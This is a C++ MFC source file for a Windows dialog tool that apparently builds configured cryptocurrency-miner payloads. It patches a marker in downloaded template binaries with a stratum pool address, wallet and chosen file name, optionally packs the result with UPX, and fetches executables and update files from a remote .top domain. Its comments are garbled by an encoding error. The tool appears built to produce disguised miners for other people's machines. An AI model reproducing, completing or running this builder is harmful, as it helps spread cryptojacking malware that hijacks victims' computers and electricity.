

#include "stdafx.h"
#include "xxs.h"
#include "xxsDlg.h"

#include "STRING.H"
#include <stdio.h>     
#include <afxinet.h> 
#include <stdio.h> 
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
	CString Noticeurl = "http://km.xn--pssa2683b.top/gg.txt";  //����ǹ����ַ

	CString LatestVersion = "http://km.xn--pssa2683b.top/scq.txt";  //�����������汾

	CString UpdateDate = "http://km.xn--pssa2683b.top/riqi.txt";  //�ڿ�����������

	CString CurrentVersion = "2.3.1";//Ŀǰ�������汾
	
	CString downloadLink = "http://km.xn--pssa2683b.top/scq.exe";//���������ص�ַ
	
	CString ProgramDownloadURL = "http://km.xn--pssa2683b.top/linux";//linux�������ص�ַ
	
	CString Winprogramdownload = "http://km.xn--pssa2683b.top/win";//win�������ص�ַ

/////////////////////////////////////////////////////////////////////////////
// CMyDlg dialog

CMyDlg::CMyDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyDlg)

	m_serdis = _T(" -B -o stratum+tcp://��ص�ַ -u Ǯ����ַ -p x -k ");
	filename = _T("thisxxs");

	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyDlg)
	
	DDX_Check(pDX, IDC_UPX, UPX);
	DDX_Text(pDX, IDC_SET_DIS, m_serdis);
	DDX_Text(pDX, IDC_SET_DIS2, filename);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyDlg, CDialog)
	//{{AFX_MSG_MAP(CMyDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_xxs, Onxxs)
	ON_EN_CHANGE(IDC_EDIT3, OnChangeEdit3)
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDOK2, OnOk2)
	ON_EN_CHANGE(IDC_SET_DIS, OnChangeSetDis)
	ON_BN_CLICKED(IDOK3, OnOk3)
	ON_EN_CHANGE(IDC_SET_DIS2, OnChangeSetDis2)
	ON_BN_CLICKED(IDOK4, OnOk4)
	ON_BN_CLICKED(IDOK5, OnOk5)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
	ON_BN_CLICKED(IDC_BUTTON3, OnButton3)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyDlg message handlers

BOOL CMyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

// �ж��ļ��Ƿ����
BOOL IsFileExist(const CString& csFile)
{
    DWORD dwAttrib = GetFileAttributes(csFile);
    return INVALID_FILE_ATTRIBUTES != dwAttrib && 0 == (dwAttrib & FILE_ATTRIBUTE_DIRECTORY);
}

CString DownloadContent(CString url)//��ȡ��ҳ����
{
	CString PageData;
	if (IsFileExist("C:\\thisxxs")!=TRUE)//�ж��ļ��Ƿ����
	{
		CInternetSession Session(NULL,0);
		CString TempData;
		CHttpFile*HttpFile=(CHttpFile*)Session.OpenURL(url);
		while(HttpFile->ReadString(TempData))
		{
			PageData+=TempData;
		}
		HttpFile->Close();
		delete HttpFile;
		Session.Close();
		//���ﷵ�ص���ҳԴ����UTF8��ʽ,Ҫת��ANSI�ȱ������������ʾ
		return PageData;
	} 
	else
	{	
		PageData ="��ǰ������ģʽ";
		return PageData;
	}
}

void update()
{
	char * Transformation = (char*)DownloadContent(LatestVersion).GetBuffer(0);
	if (strcmp(Transformation,CurrentVersion))//�ж������°汾��Ŀǰ�İ汾�Ƿ���ͬ
	{
		URLDownloadToFile(NULL,downloadLink, "�°�������.exe", 0, NULL); //���� 
		MessageBox(NULL,"�������汾�Ѹ���","��ʾ",MB_OK); 
	}
	
}

void CMyDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}

    //�����ַ
   		
	SetDlgItemText(IDC_EDIT2,DownloadContent(Noticeurl));//����
	Sleep(50);
	SetDlgItemText(IDC_EDIT3,CurrentVersion);//��ǰ�������汾
	Sleep(50);
	SetDlgItemText(IDC_EDIT4,DownloadContent(LatestVersion));//�����������汾
	Sleep(50);
	SetDlgItemText(IDC_EDIT5,DownloadContent(UpdateDate));//�ڿ�����
	Sleep(50);
	//	UpdateWindow();
}



// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMyDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


 struct FALLEN_DATA
{
	unsigned int finder;

	char xxs[1000];
	char filename[1000];

}
fallen_data =
{
	0xF9E28F8D,
	"xxs",
	"filename"


};

//���۹�����..........................................................................
void CMyDlg::build(CString file)
{
	UpdateData(TRUE);
	//	DeleteFile("xxskm");
	CString file2 ="\\\\";
	char *file1 =(LPSTR)(LPCTSTR)file2;
	strcat(file1,file);
	strcpy(fallen_data.xxs,m_serdis.GetBuffer(0));
	strcpy(fallen_data.filename,filename.GetBuffer(0));//�ڿ��ļ���
	char Path[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,Path);
	strcat(Path,file1);
	CFile oldfile;
	if (!oldfile.Open(Path,CFile::modeRead | CFile::typeBinary))
		return;
	DWORD oldfilesize = oldfile.GetLength();
	BYTE *buf = (BYTE *)malloc(oldfile.GetLength());
	memset(buf,0,oldfile.GetLength());
	oldfile.Read(buf,oldfile.GetLength());
	oldfile.Close();

    unsigned int i, k;
	for (i = 0; i < oldfilesize - sizeof(fallen_data.finder); i += sizeof(fallen_data.finder))
    {
		for (k = 0; k < sizeof(fallen_data.finder); k++)
		{
			if (buf[i+k] != ((BYTE*)&fallen_data.finder)[k])
				break;
		}
		if (k == sizeof(fallen_data.finder))
		{
			memcpy(buf+ i, &fallen_data, sizeof(fallen_data));
			break;
		}
    }
	
	if (i >= oldfilesize - sizeof(fallen_data.finder))
    {
        free(buf);
        MessageBox("д����Ϣ���ļ��У����ܶ�λ�����ļ�������!","����");
		return;
    }
	CString filetmp1 ="ok";
	char *filetmp =(LPSTR)(LPCTSTR)filetmp1;
	strcat(filetmp,file);
	CFile newfile;
	newfile.Open(filetmp,CFile::modeCreate | CFile::modeReadWrite | CFile::typeBinary);
	newfile.Write(buf,oldfilesize);
	free(buf);
	newfile.Close();
	CString filena ="���ɳɹ�!�ļ���";
	char *filenaz =(LPSTR)(LPCTSTR)filena;
	strcat(filenaz,filetmp);
	MessageBox(filenaz,"��ʾ");
	if (UPX)
	{
		ShellExecuteA(NULL, "open", "upx.exe",filetmp, NULL, NULL);//upxѹ��
		MessageBox("upxѹ���ɹ�","��ʾ");
	} 

}



void CMyDlg::OnOK() 
{
//	str.TrimRight();�����ַ����ո񣬲����Ѿ�û���˹���������
	build("xxs");

//	CDialog::OnOK();
}


void CMyDlg::Onxxs() 
{
	DeleteFile("xxs");
	URLDownloadToFile(NULL,ProgramDownloadURL, "xxs", 0, NULL); //���� 
	DeleteFile("xxs.exe");
	URLDownloadToFile(NULL,Winprogramdownload, "xxs.exe", 0, NULL);
	MessageBox("�����Ѹ���","��ʾ"); 
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnChangeEdit3() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here

	
    //�����ַ
	
	
}

void CMyDlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	URLDownloadToFile(NULL,downloadLink, "xxsgx.exe", 0, NULL); //���� 
	MessageBox("�������汾�Ѹ���","��ʾ"); 
}

void CMyDlg::OnOk2() 
{
	// TODO: Add your control notification handler code here

	build("xxs.exe");

}


#include <wininet.h>
//
// ɾ��ȫ��Internet��ʱ�ļ���Ŀ¼�е��ļ���
//
// ע�ͣ����ܹ�ͨ������������ͣ�entry type��ָ��ʲô����ɾ����
// ����Ĵ��룬cookie��ڽ�����ɾ����
// �磺[if (!(lpCacheEntry->CacheEntryType & COOKIE_CACHE_ENTRY))]
//
void Deletecaching()
{
    BOOL bResult = FALSE;
    BOOL bDone = FALSE;
    LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;
	
    DWORD  dwTrySize, dwEntrySize = 4096; // start buffer size
    HANDLE hCacheDir = NULL;
    DWORD  dwError = ERROR_INSUFFICIENT_BUFFER;
	
    do
    {
        switch (dwError)
        {
            // need a bigger buffer
		case ERROR_INSUFFICIENT_BUFFER:
			delete [] lpCacheEntry;
			lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwEntrySize];
			lpCacheEntry->dwStructSize = dwEntrySize;
			dwTrySize = dwEntrySize;
			BOOL bSuccess;
			if (hCacheDir == NULL)
				
				bSuccess = (hCacheDir
				= FindFirstUrlCacheEntry(NULL, lpCacheEntry,
				&dwTrySize)) != NULL;
			else
				bSuccess = FindNextUrlCacheEntry(hCacheDir, lpCacheEntry, &dwTrySize);
			
			if (bSuccess)
				dwError = ERROR_SUCCESS;
			else
			{
				dwError = GetLastError();
				dwEntrySize = dwTrySize; // use new size returned
			}
			break;
			
			// we are done
		case ERROR_NO_MORE_ITEMS:
			bDone = TRUE;
			bResult = TRUE;
			break;
			
			// we have got an entry
		case ERROR_SUCCESS:
			
			// don't delete cookie entry
			if (!(lpCacheEntry->CacheEntryType & COOKIE_CACHE_ENTRY))
				
				DeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
			
			// get ready for next entry
			dwTrySize = dwEntrySize;
			if (FindNextUrlCacheEntry(hCacheDir, lpCacheEntry, &dwTrySize))
				dwError = ERROR_SUCCESS;
			
			else
			{
				dwError = GetLastError();
				dwEntrySize = dwTrySize; // use new size returned
			}
			break;
			
            // unknown error
		default:
			bDone = TRUE;
			break;
        }
		
        if (bDone)
        {
            delete [] lpCacheEntry;
            if (hCacheDir)
                FindCloseUrlCache(hCacheDir);
			
        }
    } while (!bDone);
//    return bResult;
}
void CMyDlg::OnChangeSetDis3() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnChangeSetDis4() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnChangeSetDis2() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnChangeSetDis() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnOk3() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	build("armxxs");
	
//	CDialog::OnOK();
}

void CMyDlg::OnOk4() 
{
	UpdateData(TRUE);
	//����cnrig
	// TODO: Add your control notification handler code here
	build("jtxxs");
}

void CMyDlg::OnOk5() 
{	UpdateData(TRUE);
	//minearm
	// TODO: Add your control notification handler code here
	build("armxxs2");
}

void CMyDlg::OnButton2() 
{
	// TODO: Add your control notification handler code here
	HANDLE hFile;
	hFile = CreateFile("C:\\thisxxs",NULL,NULL,NULL,CREATE_ALWAYS,NULL,NULL);//�յ�
	CloseHandle(hFile);
	MessageBox("������Ч","��ʾ"); 
}

void CMyDlg::OnButton3() 
{
	DeleteFile("C:\\thisxxs");
	MessageBox("������Ч","��ʾ"); 
	// TODO: Add your control notification handler code here
	
}
